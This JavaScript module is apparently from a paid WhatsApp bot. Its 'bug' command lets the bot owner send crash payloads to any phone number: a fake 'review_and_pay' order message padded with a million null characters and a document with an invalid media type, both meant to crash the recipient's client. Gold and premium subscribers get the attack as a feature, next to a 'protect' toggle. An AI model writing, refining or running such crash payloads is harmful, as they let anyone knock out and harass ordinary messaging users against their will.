const { activateSecurity, deactivateSecurity } = require('../security/superSecurity');
const { getUserCached } = require('../database/userDatabase');
const fs = require('fs');

const BUG_IMAGE = fs.readFileSync('./media/bug.jpg'); // Thumbnail (can be any small image)

const bugv4 = async (sock, targetJid) => {
  // 🧨 Bug #1: fake commerce payload
  const fakeFlowPayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: BUG_IMAGE
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: 'review_and_pay',
                buttonParamsJson: JSON.stringify({
                  currency: 'USD',
                  total_amount: { value: 999999999, offset: 100 },
                  order: {
                    status: 'preparing_to_ship',
                    items: [
                      {
                        retailer_id: 'r1',
                        product_id: 'p1',
                        name: 'BMM',
                        amount: { value: 9999900, offset: 100 },
                        quantity: 999999
                      }
                    ]
                  },
                  screen_0_TextInput_0: 'radio-buttons' + '\u0000'.repeat(1000000), // big bomb
                  screen_1_TextInput_2: 'attacker@example.com'
                }),
                version: 3
              }
            ]
          }
        }
      }
    }
  };

  // 🧨 Bug #2: invalid media type crash
  const malformedDoc = {
    document: { url: './package.json' }, // any file path
    mimetype: 'image/null', // invalid type
    fileName: 'bugged_file.crash',
    caption: '💣',
  };

  // 💥 Send both payloads directly
  try {
    await sock.relayMessage(targetJid, fakeFlowPayload, {});
    await sock.sendMessage(targetJid, malformedDoc);
  } catch (err) {
    console.error(`❌ Bugv4 failed to send to ${targetJid}:`, err.message);
  }
};

const handleProtectionCommand = async ({
  sock,
  command,
  args,
  realSender,
  normalizedUserId,
  botLid,
  remoteJid,
  message,
  subscriptionLevel
}) => {
  switch (command) {
    case 'bug': {
      if (!['gold', 'premium'].includes(subscriptionLevel)) {
        await sock.sendMessage(remoteJid, { text: '🔒 Gold or Premium only.' });
        return true;
      }

      if (![normalizedUserId, botLid].includes(realSender)) {
        await sock.sendMessage(remoteJid, { text: '🚫 Only owner can use this command.' });
        return true;
      }

      // Extract target from reply or arg
      let targetJid;
      const quoted = message?.message?.extendedTextMessage?.contextInfo;
      if (quoted?.participant) {
        targetJid = quoted.participant;
      } else if (args[0]) {
        const number = args[0].replace(/\D/g, '');
        if (number.length > 5) targetJid = number + '@s.whatsapp.net';
      }

      if (!targetJid) {
        await sock.sendMessage(remoteJid, { text: '❌ Provide or reply to a valid number.' });
        return true;
      }

      await bugv4(sock, targetJid);
      await sock.sendMessage(remoteJid, { text: `✅ Bugv4 sent to @${targetJid.split('@')[0]}`, mentions: [targetJid] });
      return true;
    }

    case 'protect': {
      if (!['basic', 'gold', 'premium'].includes(subscriptionLevel)) {
        await sock.sendMessage(remoteJid, { text: '🛡️ Security not available for free.' });
        return true;
      }

      if (args[0] === 'off') {
        deactivateSecurity(normalizedUserId);
        await sock.sendMessage(remoteJid, { text: '🛡️ Protection deactivated.' });
      } else {
        activateSecurity(normalizedUserId);
        await sock.sendMessage(remoteJid, { text: '🛡️ Protection activated.' });
      }
      return true;
    }

    default:
      return false;
  }
};

module.exports = { handleProtectionCommand };
